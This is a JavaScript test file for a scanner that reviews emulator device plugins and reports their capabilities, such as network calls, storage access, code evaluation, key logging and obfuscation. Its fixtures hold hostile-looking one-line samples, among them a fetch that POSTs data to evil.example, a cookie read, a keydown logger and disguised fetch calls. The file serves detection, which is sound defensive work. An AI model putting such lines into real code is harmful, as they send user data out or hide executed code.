// The install check describes source capabilities without inferring intent.
// Binary data and XML namespaces are distinct from code execution and networking.

import fs from 'node:fs';
import { scanDeviceSource } from '../../src/userport/scan.js';

let testNo = 0, failing = 0, current = [];
function expect(cond, msg) { if (!cond) current.push(msg); }
function ok(label) {
  testNo++;
  if (!current.length) console.log(`ok  - test ${testNo}: ${label}`);
  else {
    failing++;
    console.log(`FAIL test ${testNo}: ${label}`);
    for (const m of current) console.log(`     - ${m}`);
    current = [];
  }
}
const ids = (src) => scanDeviceSource(src).map((f) => f.id);

const CASES = [
  ['network', "fetch('https://evil.example/x', { method: 'POST', body: data });"],
  ['network', 'new WebSocket(url);'],
  ['network', 'navigator.sendBeacon(u, d);'],
  ['network', 'new Image().src = u + secret;'],
  ['storage', "const rom = localStorage.getItem('c64emu.rom.kernal');"],
  ['storage', "indexedDB.open('c64emu-userport-devices');"],
  ['storage', 'const c = document.cookie;'],
  ['dynamic-code', 'eval(code);'],
  ['dynamic-code', "const f = new Function('a', body);"],
  ['dynamic-code', "await import('https://evil.example/m.js');"],
  ['dynamic-code', "setTimeout('steal()', 10);"],
  ['input', "document.addEventListener('keydown', log);"],
  ['input', 'navigator.clipboard.readText();'],
  ['input', "addEventListener('paste', grab);"],
  ['internals', 'window.machine.mem.ram[0x0801] = 0;'],
  ['internals', 'globalThis.c64.loadPRG(x);'],
  ['persistence', "navigator.serviceWorker.register('/sw.js');"],
  ['persistence', "caches.open('x');"],
  ['navigation', "location.href = 'https://phish.example';"],
  ['navigation', "window.open('https://ads.example');"],
  ['navigation', "history.pushState({}, '', '/login');"],
  ['hidden', "globalThis['fe' + 'tch'](u);"],
  ['encoded-data', "const s = atob('ZmV0Y2g=');"],
  ['printing', 'win.print();'],
  ['hidden', 'String.fromCharCode(102, 101, 116, 99, 104, 40);'],
  ['hidden', `const blob = '${'QUFB'.repeat(60)}';`],
  ['hidden', `const x = 1;${' '.repeat(1100)}const y = 2;`],
  ['page', "document.body.append(fakeDialog);"],
  ['embedded-document', "frame.srcdoc = '<html><body>output</body></html>';"],
  ['embedded-document', "doc.createElement('iframe');"],
  ['page', "document.querySelector('#btn-power').click();"],
  ['page', 'window.top.postMessage(x);'],
  ['background', "new Worker('miner.js');"],
  ['background', 'WebAssembly.instantiate(bytes);'],
  ['background', 'navigator.mediaDevices.getUserMedia({ video: true });'],
];

{
  for (const [id, src] of CASES) {
    expect(ids(src).includes(id), `${id} not found in: ${src.slice(0, 60)}`);
  }
  const seen = new Set(CASES.map(([id]) => id));
  expect(seen.size === 13, `thirteen review categories covered, got ${seen.size}`);
  ok('each review category is found in typical code');
}

{
  const benign = `
    // fetch(url) and localStorage in a comment are not code
    /* eval(x); location.href = y; */
    const el = document.createElement('div');
    el.addEventListener('click', () => {});
    const s = host.openSocket('bbs.example', 23);
    host.storage.set('k', 1);
    const text = String.fromCharCode(b);
    const fetchCount = 1;
    if (a === b) { const locationKnown = true; }
  `;
  const found = scanDeviceSource(benign);
  expect(found.length === 0, `nothing flagged in what devices need: ${JSON.stringify(found.map((f) => [f.id, f.lines]))}`);
  ok('comments, createElement, click listeners, host.openSocket and host.storage are not flagged');
}

{
  const src = "const a = 1;\n\nfetch('https://evil.example/log?d=' + x);\nconst u = 'wss://c2.example/ws';\n";
  const net = scanDeviceSource(src).find((f) => f.id === 'network');
  expect(net && net.lines.join(',') === '3', `line numbers point at the code: ${net?.lines}`);
  expect(net && net.addresses.includes('https://evil.example/log?d=') && net.addresses.includes('wss://c2.example/ws'), `addresses listed: ${net?.addresses}`);
  const only = scanDeviceSource("const home = 'https://example.org/docs';").find((f) => f.id === 'network');
  expect(only && only.title === 'Contains web addresses', 'an address alone is still shown');
  ok('findings give line numbers, and any web addresses in the code');
}

{
  const order = scanDeviceSource("atob(s);\nnew Worker('w.js');\nlocalStorage.x = 1;").map((f) => f.severity);
  expect(order.join(',') === 'high,medium,info', `most serious first: ${order}`);
  ok('high and medium findings precede informational findings');
}

{
  for (const f of ['../../public/userport/led-board.js']) {
    const found = scanDeviceSource(fs.readFileSync(new URL(f, import.meta.url), 'utf8'));
    expect(found.length === 0, `${f.split('/').pop()} is clean: ${JSON.stringify(found)}`);
  }
  ok('the LED board has no review findings');
}

{
  const result = scanDeviceSource("const bytes = atob(host.storage.get('job')); ");
  expect(result.length === 1 && result[0].id === 'encoded-data' && result[0].severity === 'info', 'Base64 decoding is informational, not a claim of concealed behavior');
  expect(ids("eval(atob(payload));").includes('dynamic-code'), 'executing decoded data remains a high code-execution finding');
  expect(ids("new Function(atob(payload));").includes('dynamic-code'), 'constructing a function from decoded data remains a code-execution finding');
  ok('binary decoding is distinguished from executing encoded code');
}

{
  expect(ids("document.createElementNS('http://www.w3.org/2000/svg', 'svg');").length === 0, 'the SVG namespace is an identifier, not a network destination');
  expect(ids("fetch('http://www.w3.org/2000/svg');").includes('network'), 'fetching even a namespace URL is still network activity');
  expect(ids("const url = 'http://www.w3.org/2000/svg.evil.example';").includes('network'), 'namespace lookalikes are still listed as web addresses');
  ok('exact XML namespaces are not mistaken for network requests');
}

{
  const printer = scanDeviceSource(fs.readFileSync(new URL('../../public/iec/printer.js', import.meta.url), 'utf8'));
  expect(['embedded-document', 'encoded-data', 'printing'].every(id => printer.some(f => f.id === id)) && !printer.some(f => ['page', 'navigation', 'network', 'hidden', 'dynamic-code'].includes(f.id)), `printer review shows its print document, native print dialog and data decoding: ${JSON.stringify(printer)}`);
  const modem = scanDeviceSource(fs.readFileSync(new URL('../../src/userport/devices/modem.js', import.meta.url), 'utf8'));
  expect(modem.length === 1 && modem[0].id === 'input', `modem review describes its relay form events: ${JSON.stringify(modem)}`);
  ok('printer and modem reviews describe their actual capabilities');
}

console.log(failing ? `\n${failing} of ${testNo} FAILED` : `\nall ${testNo} passed`);
process.exit(failing ? 1 : 0);
